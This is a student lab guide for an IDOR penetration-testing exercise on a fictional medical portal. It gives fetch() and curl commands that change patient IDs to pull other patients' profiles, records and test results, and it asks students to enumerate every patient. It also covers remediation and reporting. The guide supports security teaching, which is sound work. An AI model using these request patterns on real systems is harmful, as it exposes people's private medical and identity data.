# 🎓 Student Guide: IDOR Vulnerability Testing

## HealthTrack Medical Portal - Penetration Testing Exercise

### Scenario

You've been hired as a security consultant to test the **HealthTrack Medical Portal**, a patient records system used by a private healthcare provider. Your task is to identify and exploit any Insecure Direct Object Reference (IDOR) vulnerabilities that could allow unauthorised access to patient data.

**Context:** The portal allows patients to view their medical records, test results, and appointments. Each patient should only be able to access their own information. Your job is to determine if this security control is properly implemented.

---

## ⚠️ Important: Ethical Guidelines

This is a **controlled penetration testing exercise** in an isolated environment. In the real world:

- **NEVER** attempt penetration testing without explicit written authorisation
- Unauthorised access to computer systems is illegal under the Computer Misuse Act 1990
- Always operate within the scope of your authorisation
- Report all findings responsibly through proper channels

---

## 🎯 Learning Objectives

By completing this exercise, you will:

1. Understand what IDOR vulnerabilities are and why they're dangerous
2. Learn to identify IDOR vulnerabilities in web applications
3. Practice exploiting IDOR vulnerabilities using browser tools
4. Understand the security impact of inadequate authorisation controls
5. Learn how to document and report security findings

---

## 🔧 Tools You'll Need

- **Web Browser** (Chrome, Firefox, or Edge recommended)
- **Browser Developer Tools** (F12 or right-click → Inspect)
- **Network Tab** in DevTools to view API requests
- **Console** for manipulating requests

Optional:
- **curl** for command-line testing
- **Burp Suite** or **OWASP ZAP** for more advanced testing

---

## 📋 Step 1: Initial Access

1. Open your web browser and navigate to the HealthTrack portal
2. You'll see a login page with demo credentials provided
3. Log in using the first set of credentials:
   - **Username:** `jsmith`
   - **Password:** `password123`

4. After logging in, you'll see John Smith's patient dashboard with:
   - Personal information
   - Medical records
   - Test results
   - Upcoming appointments

**Question to consider:** How does the application know which patient's data to display?

---

## 🔍 Step 2: Reconnaissance

Before attempting any exploitation, you need to understand how the application works.

### Using Browser DevTools

1. Press **F12** to open Developer Tools
2. Go to the **Network** tab
3. Refresh the page to see all network requests
4. Filter by **Fetch/XHR** to see only API calls

### What to Look For

Examine the API requests being made. You should see requests like:
- `/api/patient/1`
- `/api/records/1`
- `/api/tests/1`
- `/api/appointments/1`

**Key Observation:** Notice the numbers in these URLs? These are **patient IDs**. The number `1` corresponds to the logged-in user (John Smith).

**Critical Question:** What happens if you change these IDs?

---

## 🎯 Vulnerability 1: Accessing Other Patient Profiles

### The Exploit

1. In the Network tab, find the request to `/api/patient/1`
2. Right-click on it and select **Copy** → **Copy as fetch**
3. Go to the **Console** tab
4. Paste the copied fetch code
5. **Modify** the URL to change the patient ID from `1` to `2`:

```javascript
fetch("http://your-server-ip:3000/api/patient/2", {
  "credentials": "include",
  "headers": {
    "Accept": "application/json"
  },
  "method": "GET"
}).then(response => response.json()).then(data => console.log(data));
```

6. Press **Enter** to execute

### Expected Result

You should receive patient information for Emma Jones (patient ID 2), even though you're logged in as John Smith!

```json
{
  "id": 2,
  "first_name": "Emma",
  "last_name": "Jones",
  "date_of_birth": "1990-07-22",
  "nhs_number": "NHS-002-3456",
  "email": "emma.jones@email.com",
  "phone": "07700 900002",
  "address": "45 Park Lane, Manchester, M1 1AA"
}
```

### Security Impact

**Critical:** You've just accessed another patient's personal information, including their NHS number and address. This is a serious data breach.

---

## 🎯 Vulnerability 2: Viewing Other Patients' Medical Records

### The Exploit

Medical records contain highly sensitive information. Let's test if these are properly protected.

1. In the Console, execute:

```javascript
fetch("http://your-server-ip:3000/api/records/2", {
  "credentials": "include"
}).then(response => response.json()).then(data => console.log(data));
```

2. Try different patient IDs (1-5) to access various patients' records

### Expected Result

You'll receive detailed medical records including:
- Diagnoses
- Treatment plans
- Doctor names
- Clinical notes

### Security Impact

**Severe:** Medical records are protected under GDPR and data protection legislation. Unauthorised access could result in:
- Regulatory fines
- Patient harm
- Reputational damage
- Legal action

---

## 🎯 Vulnerability 3: Accessing Test Results

### The Exploit

```javascript
fetch("http://your-server-ip:3000/api/tests/3", {
  "credentials": "include"
}).then(response => response.json()).then(data => console.log(data));
```

### What You'll Find

Sensitive test results including:
- Blood test results
- Imaging results
- Pathology reports

---

## 🎯 Vulnerability 4: Viewing Appointments

### The Exploit

```javascript
fetch("http://your-server-ip:3000/api/appointments/4", {
  "credentials": "include"
}).then(response => response.json()).then(data => console.log(data));
```

### Security Impact

While seemingly less critical, appointment data reveals:
- Health conditions (from appointment reasons)
- Patient movements
- Doctors being consulted

---

## 🔨 Alternative Method: Using curl

If you prefer command-line tools:

```bash
# First, login and capture the cookie
curl -c cookies.txt -X POST http://your-server-ip:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"jsmith","password":"password123"}'

# Then access other patients' data
curl -b cookies.txt http://your-server-ip:3000/api/patient/2
curl -b cookies.txt http://your-server-ip:3000/api/records/3
curl -b cookies.txt http://your-server-ip:3000/api/tests/4
```

---

## 📊 Exercise: Complete Enumeration

**Task:** Access data for all 5 patients in the system (IDs 1-5) and document:

1. All patient names
2. At least one medical condition for each patient
3. Any upcoming appointments

Create a table with your findings:

| Patient ID | Name | NHS Number | Sample Medical Condition |
|------------|------|------------|--------------------------|
| 1 | John Smith | NHS-001-2345 | Type 2 Diabetes |
| 2 | | | |
| 3 | | | |
| 4 | | | |
| 5 | | | |

---

## 🛡️ Understanding the Vulnerability

### What is IDOR?

**Insecure Direct Object Reference** occurs when an application:
1. Uses identifiable references (like IDs) to access objects
2. Fails to verify that the user is authorised to access that object
3. Exposes these references in URLs, parameters, or API calls

### Why is this dangerous?

- **Predictable IDs:** Sequential numbers (1, 2, 3...) are easy to enumerate
- **No authorisation check:** The server doesn't verify ownership
- **Authentication ≠ Authorisation:** Being logged in doesn't mean you should access everything

### The Missing Security Control

The server should check:

```javascript
// SECURE VERSION (not implemented in this demo)
if (requestedPatientId !== loggedInUserId) {
    return res.status(403).json({ error: 'Forbidden' });
}
```

---

## 📝 Reporting Your Findings

As a penetration tester, you must document and communicate your findings clearly.

### Sample Vulnerability Report

**Title:** Insecure Direct Object Reference in Patient Data API

**Severity:** Critical

**Affected Endpoints:**
- `/api/patient/:id`
- `/api/records/:patientId`
- `/api/tests/:patientId`
- `/api/appointments/:patientId`

**Description:**
The HealthTrack Medical Portal fails to implement proper authorisation controls on patient data endpoints. An authenticated user can access any patient's sensitive information by manipulating the patient ID parameter in API requests.

**Proof of Concept:**
1. Log in as `jsmith` (patient ID: 1)
2. Make a request to `/api/patient/2`
3. Receive unauthorised access to Emma Jones's patient data

**Impact:**
- Unauthorised access to all patient records
- GDPR violation
- Breach of medical confidentiality
- Potential for data theft and identity fraud

**Remediation:**
Implement server-side authorisation checks to verify that `req.userId === requestedPatientId` before returning any patient data.

---

## 💭 Discussion Questions

1. **Why might developers forget to implement these checks?**
   - Consider time pressure, complexity, and assumptions about client-side security

2. **Are there legitimate use cases for accessing other users' data?**
   - How would you implement this securely (e.g., for doctors, administrators)?

3. **How could this system be exploited at scale?**
   - Think about automated scripts and data harvesting

4. **What other types of IDOR vulnerabilities exist?**
   - File access, financial transactions, social media posts, etc.

---

## 🎓 Key Takeaways

1. **Authentication ≠ Authorisation**
   - Just because you're logged in doesn't mean you should access everything

2. **Never trust client-side security**
   - All security controls must be enforced server-side

3. **Validate, validate, validate**
   - Always verify that users can only access their own resources

4. **Think like an attacker**
   - Question every parameter: "What if I change this?"

5. **IDOR is common**
   - OWASP lists it in the Top 10 (A01:2021 - Broken Access Control)

---

## 📚 Further Learning

- **OWASP Top 10:** A01:2021 - Broken Access Control
- **CWE-639:** Authorisation Bypass Through User-Controlled Key
- **OWASP Testing Guide:** Testing for IDOR
- **PortSwigger Web Security Academy:** Access Control Vulnerabilities

---

## ✅ Achievement Check

By the end of this exercise, you should have:

- [ ] Successfully logged into the HealthTrack portal
- [ ] Identified IDOR vulnerabilities in API endpoints
- [ ] Exploited IDOR to access other patients' data
- [ ] Used browser DevTools to manipulate API requests
- [ ] Understood the difference between authentication and authorisation
- [ ] Documented findings in a professional manner
- [ ] Considered real-world impact and remediation strategies

---

**Remember:** Use this knowledge responsibly. Only perform penetration testing on systems you have explicit permission to test. Unauthorised access is illegal and unethical.

Good luck with your testing! 🔐
